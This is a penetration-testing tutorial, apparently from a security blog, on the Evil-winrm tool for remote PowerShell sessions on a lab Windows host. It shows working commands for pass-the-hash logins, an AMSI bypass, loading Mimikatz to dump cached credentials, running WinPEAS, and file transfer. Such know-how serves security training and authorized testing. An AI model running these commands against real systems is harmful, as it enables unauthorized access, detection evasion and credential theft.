### Background

Evil-winrm tool is originally written by the team Hackplayers. The purpose of this tool is to make penetration testing easy as possible especially in the Microsoft Windows environment. Evil-winrm works with PowerShell remoting protocol (PSRP). System and network administrators often use Windows Remote Management protocol to upload, edit and upload. WinRM is a SOAP-based, and firewall-friendly protocol that works with HTTP transport over the default HTTP port 5985. For more information about PowerShell remoting, consider visiting Microsoft’s official site.

**[https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.3](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.3)**

### Table of Content

-   Introduction to Evil-winrm
-   Winrm Service Discovery
-   Evil-winrm Help – List Available Features
-   Login With Plain Texted Password
-   Login with Plain Texted Password – SSL Enabled
-   Login with NTLM Hash -Pass The Hash Attack
-   Load Powershell Script
-   Store logs with Evil-winrm
-   Disable Remote Path Completion
-   Disable Coloured Interface
-   Run Executables File
-   Service Enumeration with Evil-winrm
-   File Transfer with Evil-winrm
-   Use Evil-winrm From Docker
-   Login with the key using Evil-winrm
-   Conclusion

### Introduction to Evil-winrm

Evil-winrm open-sourced tool written in ruby language making post exploitation easy as possible. This tool comes with many cool features which include remote login with plain texted password, SSL encrypted login, login with NTLM hash, login with keys, file transfer, logs store etc. The authors of the tool keep updating this tool and adding many new features which made Internal assessment easier. Using evil-winrm, we get a PowerShell session of the remote host. This tool comes with all modern Kali Linux but if you wish to download then you can download it from its official git repository.

Download Link: **[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)**

### Winrm Service Discovery

As we have discussed earlier that the evil-winrm tool is used if the Winrm service is enabled in the remote host. To confirm, we can look for the two default winrm service ports 5895 and 5896 open or not using nmap. From the nmap result, we found that winrm service is enabled so we can use evil-winrm to log in and perform other tasks which we are going to explore in the lateral phases.

nmap -p 5985,5986 192.168.1.19

nmap -p 5985,5986 192.168.1.19

```
nmap -p 5985,5986 192.168.1.19
```

### ![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhX4BH15fcVaS2fdbUP9yAHYbe3eXmcq9k3TbJKV2a5wxi7UoVhBauzHA4jytwcDp8Uon-C8N3LY_vwUF3HPvAxWq_R6Z6dzeLpIlCaLDrNyxE8U8u_x1LjgU_jyUKyGmXNWppSe26DTMj6eDZG9AgeVYC2i1H93WXvs7VcmYAjaT4S9kuy0FoxzK04lg/s16000/1.png?w=640&ssl=1)

### Evil-winrm Help – List Available Features

Many penetration testers and the CTF players have used this tool quite often during internal assessments but still many of us are unaware of the tool’s extra features which can make our assessment much easier than ever.  To list the all-available cool features of the evil-winrm, we can simply use **\-h** flag and that will list all the help commands with descriptions.  We are going to cover as much as possible in this article and encourage everyone to play with other features as well.

```
evil-winrm -h
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQ-4N3NZHMJBIWWT0L_lVGyFOo_DiW7Nr3Ls6pFNVxAraW_jB6xVTZdLGhj1xBtEE-9ewTcxXjIg6Lfmznte1mCgqIqY7QsBF4Cmg7ySzMhBlygKghOKBFsDXja-lCfbMOGoYZVmuyQoeAJ0JclL4_9pbCkieAKhKXs-fbHV-t1yfkytreQgAfCkHNnA/s16000/2.png?w=640&ssl=1)

### Login With Plain Texted Password

Suppose we have obtained a plain texted password during the enumeration phase, and we noticed that winrm service is enabled in the remote host. Then we can take a remote session on the target system using evil-winrm by issuing the IP address of the remote host with **\-i** flag, username with **\-u** flag and the password with **\-p** flag. In the below picture, we can see that it has established a remote PowerShell session.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987

```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe_SzAv7Joh2me4Vdofre2DZPcSfjJo-DNbmszEL9vXdasM2jfdHpSirMRmlulEYgc4epMngwA0k5lIjIXGkrMIprSC6rDyrvLHEAMXR95lmpY9ny3D1uYITo-0j-R1q-lrR4ikpfMaIw6khGe1-SXuZNFAn3kghszaGNMjK6FkWWYnkyd7thuzBmaGw/s16000/4.png?w=640&ssl=1)

### Login with Plain Texted Password – SSL Enabled

As we have mentioned earlier that the winrm service transports traffic over the HTTP protocol then we can use Secure Socket Layer (SSL) feature to make the connection secure. Once we enable the SSL feature then our data will be delivered over an encrypted secure socket layer. With evil-winrm, we can achieve the objective using **\-S** flag along with our previous command that we used to establish a connection to the remote host.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S

```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOAfaCC9m4qMV4FjurV12Qfo3U3OHMA7ngvltegNDXW2tBLZYfh7CwNm3FwGjgpEgYBpPR1hFkx5RWNeIndABKy6Ze6HVZkli-InYrgIQy2y1668xASOnJIXqkltEY51pU9C9ym41NZHI-AaG9PPSEOUCD1pieoKzprAHvmiHAF4u3F4ME2Nfk7-0xFQ/s16000/5.png?w=640&ssl=1)

### Login with NTLM Hash -Pass The Hash Attack

During the internal assessment or solving any CTF related to windows privilege escalation and Active Directory exploitation, we often get NTLM hash by using our exploits and the attacks. If we are in the windows environment, we can utilise evil-winrm to establish a PowerShell session by performing pass the hash attack where we issue hash as a password instead of using a plain texted password. Apart from that, this attack also supports other protocols as well. We can pass the hash using **\-H** flag along with the command we used earlier replacing the password section with the hash. More detailed guide about the pass-the-hash attack is available in the below link:

**[https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)**

evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38

evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38

```
evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUT9NJqZ1mSnsVg7Fh8R1r_9t0PP5nZPzTf1ya17cXkZJKVTjgk4a9ixFLVKHkH9yfNnCcrpgS1aGk1S7Om46RPCpiGKqd2CjRtorV3Uiwyk0TYfj4MvKDS2hu0_qYOszrP7cfcwxmDOJFF5hy-1_n33pQ6weSm4HAAkanY6navDEYprIoZH8MSVghug/s16000/6.png?w=640&ssl=1)

### Load Powershell Script

Evil-winrm also comes up with a feature which allows us to use scripts from our base machine. We can directly load scripts directly into the memory using **\-s** flag along with the script file path where we have stored scripts I our local machine. Furthermore, it also comes up with AMSI feature which we often require before importing any script. In the below example, we are bypassing AMSI then directly calling Invoke-Mimiktz.ps1 script from our system to the target machine and loading it into the memory. After that, we can use any mimikatz command. For demonstration purpose, here we have dumped credentials from the cache. After dumping credentials, we can perform pass the hash attack with obtained NTLM hash again. Follow the steps below to reproduce the attack with evil-winrm.

**[https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1)**

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtxyXy0DyqxFEfaQ3iU9DY4WC5Q2hM0KomwWy7NMR_N-FXPBGJbKgNtyvOe-1i2lQJxFjzzqRyeBlAkMLE3lUWlJW4FJcKtO3lmPWjPXhiJ5mzxpOIqwnfSMALTns0caf1BWeuQCQTRip75vpLRTHBbTQKQZH0mwIjkw82pIJB7h1L4d1spn8mfoXa4Q/s16000/7.png?w=640&ssl=1)

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell Bypass-4MSI Invoke-Mimikatz.ps1 Invoke-Mimikatz

```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWrZ3OLHp37tUrBA1GeeWdfI9yKRIYWjgdTd23gGHkm2YZTE--ajyOiGA0R3QrZWGpIS7OM-hoB8a0SihgP07gVuqKN66OeVSzZhxF_-KbPffs2xuqscSeTiGPsOHn_vImPAqAY5t6ulX_x8kS80c-sJdqF9Y68SdE_8XVMogGGBNJKXHZFF6ojSE2dQ/s16000/8.png?w=640&ssl=1)

### Store logs with Evil-winrm

This feature is designed to save logs to our local system while performing enumeration after getting a remote session. When we are playing CTF or in the real-time internal penetration testing engagement, we need to keep references for the reporting. Evil-winrm gives that freedom to save all logs into our base machine using **\-l** flag. We can take any remote session using evil-winrm and add -l flag so it will save all the logs to our base machine in **/root/evil-winrm-logs** directory with the date and IP address which can be used later for the references. In the below example, we have used the ipconfig command and the output of the command saved in our base machine at the same time.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l

```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzXNJmLa5FndDX_XCvryqG8q5UJ7ByWxpF6Y7HdX1-pVOb6WhwE2nlMXYnjvu_uqQ_5043i7At05F9Ji3-C7sOLwIkd-LrcIbsh6VH9Le2AFRU9fohrLZBKyDdGDW9EdpMbhcFGIKdny9RtgCqHYVcuQNAJFlv82D7CLvvKPzxqJKSifRE_HM0GGBAzA/s16000/9.png?w=640&ssl=1)

We can verify it by checking the saved logs contents, you will notice it has captured the screenshot of the terminal where we used the ipconfig command.

**![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-4BJFw_cOHEE8Up8tKCaY45gwfPnDMMg9b4VImkwdLXIY3FGQpp3uAMtgb0AznA3udhmIc2Jhe25UanrRG-IFuNDpsxReO_9kube4Enh9H5jcrBeGf3qdr_QbifJtwOOOya3eD_wncMgTWOrtE-piTDqieteFDerPlTD2fLznDowzYoCktfsUaoaQWw/s16000/10.png?w=640&ssl=1)**

### Disable Remote Path Completion

By default, it comes with the remote path completion feature, but if we wish to disable remote path completion, we can add **\-N** flag along with our command. It depends on individuals whether they prefer the auto-completion feature on or off but if you are comfortable with auto-completion then feel free to go with its default function.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -N

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -N

```
 evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -N
```

**![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQFof1y-dV4OjqHmgGanj8aajN2v6iBE8PaSDf96sKzEOEiEkIIt6YX_lA2285N2KYHetBh3RdLQgt-QI5eB7aEmyGclOQ7TE0QEX-YS6yLiGCB1Bk2pgGXk3EARQuhOS_kFU456wvkVFul4bvf9AocgudzW8U3lgJJVgQPaZtzslGDczhSTl6iOnB6A/s16000/11.png?w=640&ssl=1)**

### Disable Coloured Interface

Whenever we establish any remote session using evil-winrm, it spawns a beautiful, coloured command line interface. Still, if we wish to disable the coloured interface then we can also do that using **\-n** flag along with our command while establishing a session.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -n

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -n

```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -n
```

**![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTrglAX8xtQyv4KzCGUGA7N94rS9z2HsaQrXGE8-xie9nAJjeZ_XwxwGRD6b3deyauNtwI2iK6Wh-s5RZUmsLS7P-5MVhq5ZqMZun9XpQCNAceNdCfU_v82ewpIvTByBQ0l4MXWd-K5Lk51KTgBiZXyWRddm3dH8-u-kT_F98G7IJAF-2kPWnQKKM9LQ/s16000/12.png?w=640&ssl=1)**

### Run Executables File

This feature is designed to tackle real-time problems and difficulties we faced during the assessment when we have a PowerShell session, and we cannot drop it to the command line. In such scenarios, we wish if we could run exe executables in the evil-winrm sessions. Suppose we have an executable that we want to run in the target system.

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimPtOZc3YmskOpn9kA3_DqkwHmYixL7oVPZn-71hX7rtpkLv65ZiQQ6TjqhHfggGXEe78MD4ZZQNIaaBhlZVOPeEEB_2pvxPD68cY42FP1PJ199KfdNmzZyvDLdcC8yq5PgXx2ZpY1ca4Q1OGesh5J9Ob0Asu_iVZbVRI08yArDZf2vK8bo_0FLtY1Dw/s16000/13.png?w=640&ssl=1)

 Hackplayers team designed this tool again and added an additional feature where we can run all executables like a charm while in the evil-winrm PowerShell session. Similarly, as we used -s flag to execute the PowerShell scripts path, this time we use **\-e** flag to execute exe executable binaries. In the below example, we are issuing a path whereWinPEAS.exe executable is stored in the local machine and run it using an additional feature (**Invoke-Binary**) from the evil-winrm menu. This feature allows us to execute any exe binaries that usually run in the command line shell.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc

Invoke-Binary /opt/privsc/winPEASx64.exe

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc Bypass-4MSI menu Invoke-Binary /opt/privsc/winPEASx64.exe

```
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1HbFIHZrCdFDc-TospIBJBOOLl6Znt68mtLt7qbUJwwzleEEIqEbX_kEMQlXNmeMzzuW6AdvgGpFVzzfkBZq-SrWVpG8u9dsf2W9lzFUdeFRUnf1XUr5m-gER75GCw1GvIbsCUai31loYcc5-UVGoHigLXsu_54yN7o22vn6-IIb1YRotWYg4lZe4nw/s16000/14.png?w=640&ssl=1)

Once we set an executables path then we can use any executable that we wish to run into the target system. In the below example, we are calling WinPEASx64.exe and running it into the target system with evil-winrm. As we can see, it is working fine as expected.

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfC1qx5x21vYOpemsV-aF4FfbiLy2cdlWuvZEktqduHu2qJxiu2CkeTK8hPomieCBzFzJQ6gcKLJ0YyQDvC-iWPNZkuCA76cB9shHSyZM3yQWhTRTKpIQGcr3iBV4rzMlJUE0xT248WaTROx0tiLujTy0u_CqYlwQAfP-ZAApP3eBM7CYE9I7wHNc8sA/s16000/15.png?w=640&ssl=1)

### Service Enumeration with Evil-winrm

Sometimes many post-exploitation enumeration tools fail to detect the service name that is running in the target system. In that scenario, we can use evil-winrm to find the service names running in the target system. To do that, we can again go to the menu and use services feature. It will list all the services running into the compromised host. This feature can be very handy when we see there is any unquoted service installed in the target system and other post-exploitation tools fail to identify the service name.

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_M5QqtZiEsNt67o-QiAo2h3vlSANXg63OMdj72Gy248b0uP-6JHDih9kIMuyILepwcg3NILL_28W30hhvE4apwgKUH6JkOZAmjIePuHr1MofdgdKyWG4ra3IxduvS7Jdwa2qKn2o9k7JsbSLRf26iHpmrmqhXZFvbXWbCU5G7Ef_CIhLGzUDN0xcHFA/s16000/16.png?w=640&ssl=1)

### File Transfer with Evil-winrm

There is no doubt that evil-winrm has given its best to make our work easy as possible. We always need to transfer files from the Attacking machine to the remote machine in order to perform enumeration or other things. Instead of setting the python server and downloading it from the target system, we can simply use the **upload** command with the filename. This is a life-saving feature that the evil-winrm tool is giving especially in such scenarios when we face outbound traffic rules set in the target system and when we are using evil-winrm with proxies. In the below example, we are uploading the **notes.txt** file in the target system.

```
upload /root/notes.txt .
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV0LYXEelOEl_x-PT2bJaSLRp6fsu9Lnu2btIjge24KumeMLT-QE3ztsX9WmhfSRRW9KyCcnNZB4J-U6jsHQ88X25UiQY09UkbuG4ZjjEXVRkRDbzWwp3iLVQkANtFAnJg8FrM7TigEm10mVvOCTAGI5Qow43-wUW3Nvlr88OOgkQIFziAc5QAb44Yfg/s16000/17.png?w=640&ssl=1)

Similarly, we can download the file from the target system to the attacker’s machine using the **download** command along with the file name.

download notes.txt /root/raj/notes.txt

download notes.txt /root/raj/notes.txt

```
download notes.txt /root/raj/notes.txt
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXS3qvhGiUEKBFNhb7VJcRdIRYJx_Ls91JWqekyxzrjavIMCTSlEQP97glCymhu10zsX0gAf_HeFjxZJr47x9TmOHvXYeUeHm6MHazNsWtYBcimmlcDzF8t5GpDg_Z3OVshf2VfV3Y--kgqmwpHUE3RkHoct-tyD0BqYONh9KIH_yJnveguYHMHsJc-A/s16000/18.png?w=640&ssl=1)

We can verify it by navigating the path we downloaded notes.txt in the attacking machine.

**![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_7c1A6iq4Az8HYbs7Pk9WYmqRfYEUHGk585B2sHS3Hs_r-vNZe5fjXl4dEIBGnkVNpoo4vAyoDCu_WkC0vLiiTatAm1SkVN84I-yqMqvCtH14cE4NaDQstmW7ET0kk6tD46vjhSljL0gxvmKGWbTgRssDCh_6yypPDvw6579AlF-Q7wWKtbXmv76HiQ/s16000/19.png?w=640&ssl=1)  
**

### Use Evil-winrm From Docker

This tool also can be installed in the docker. If we have another system in the docker where evil-winrm is installed, then we can also call it from the docker. It will work the same as it was working in the main base system without any problem. To do that, follow the docker syntax along with the evil-winrm command to call it from the docker.

docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'

docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'

```
docker run --rm -ti --name evil-winrm  oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOIailYL9GKluzCKk-zrkspNoT3ogvCd6OGtYu7aITQpFZsrkXS-Utz9_89z2h1xufIoDwZiG4tbVKm7WX0Pvb4I7EMHc6Sieu5whgNO2oeRPI7cMsIuurqclUtETYXyziDimBMdfOv3zXfrJoUywKW9WjPxQNUqJxtA5vm4cPQAcLldupymseVgHNcg/s16000/20.png?w=640&ssl=1)

### Login with the key using Evil-winrm

Evil-winrm also allows us to use the public and private key to establish a remote session using the **\-c** flag for the public key and the **\-k** flag for the private key. In addition, we can also add **\-an S** flag to enable SSL to make our connection encrypted and secure.

evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S

evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S

```
evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S
```

![](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizVJClp8gbrg8lp7DlPrz9aSIJVjvMxsbvtiS1gF81v5rn9ejrOotdZ2121ZW9HPlXvh4R1Uo8m-irhwCa4xzGi5Cc0ZGDjp2Y-SnGzkwj2AWkM74cm-OBs802lMz-TCaRJ7ajM-EedpXiqhAI0uSyRwpdtYYFNkxf706NPV-BRNDrC6K-Pbp4qk1pIQ/s16000/21.png?w=640&ssl=1)

### Conclusion

We have explored the Evil-winrm tool briefly and its special features which will go to make our Internal assessment much easier. We have explored multiple techniques to establish a remote session using evil-winrm. Also, we have explored some of its advanced features which will enhance our productivity in the production environment as well as in the CTFs. Lastly, I would like to thank Hackplayers for making such a great tool. I hope you have learned something new today. Happy hacking!

**Author:** Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here**: [Linkedin](https://au.linkedin.com/in/subhash-paudel-a021ab207)** and **[Twitter](https://twitter.com/subhashpaudel94)**